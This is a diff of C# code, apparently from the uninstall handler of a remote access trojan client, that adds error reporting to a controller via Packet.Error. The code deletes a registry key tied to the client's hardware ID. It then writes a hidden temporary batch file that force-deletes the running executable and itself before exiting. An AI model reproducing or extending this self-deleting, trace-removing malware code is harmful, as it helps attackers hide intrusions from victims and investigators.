@@ -32,33 +32,46 @@ namespace Plugin.Handler
                         });
                     }
                 }
-                catch { }
+                catch(Exception ex)
+                {
+                    Packet.Error(ex.Message);
+                }
             }
 
             try
             {
                 Registry.CurrentUser.CreateSubKey(@"", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteSubKey(Connection.Hwid);
             }
-            catch { }
-
-            string batch = Path.GetTempFileName() + ".bat";
-            using (StreamWriter sw = new StreamWriter(batch))
+            catch (Exception ex)
             {
-                sw.WriteLine("@echo off");
-                sw.WriteLine("timeout 3 > NUL");
-                sw.WriteLine("CD " + Application.StartupPath);
-                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + "\"" + " /f /q");
-                sw.WriteLine("CD " + Path.GetTempPath());
-                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
+                Packet.Error(ex.Message);
             }
-            Process.Start(new ProcessStartInfo()
+
+            try
             {
-                FileName = batch,
-                CreateNoWindow = true,
-                ErrorDialog = false,
-                UseShellExecute = false,
-                WindowStyle = ProcessWindowStyle.Hidden
-            });
+                string batch = Path.GetTempFileName() + ".bat";
+                using (StreamWriter sw = new StreamWriter(batch))
+                {
+                    sw.WriteLine("@echo off");
+                    sw.WriteLine("timeout 3 > NUL");
+                    sw.WriteLine("CD " + Application.StartupPath);
+                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + "\"" + " /f /q");
+                    sw.WriteLine("CD " + Path.GetTempPath());
+                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
+                }
+                Process.Start(new ProcessStartInfo()
+                {
+                    FileName = batch,
+                    CreateNoWindow = true,
+                    ErrorDialog = false,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+            }
+            catch (Exception ex)
+            {
+                Packet.Error(ex.Message);
+            }            
 
             Methods.ClientExit();
             Environment.Exit(0);
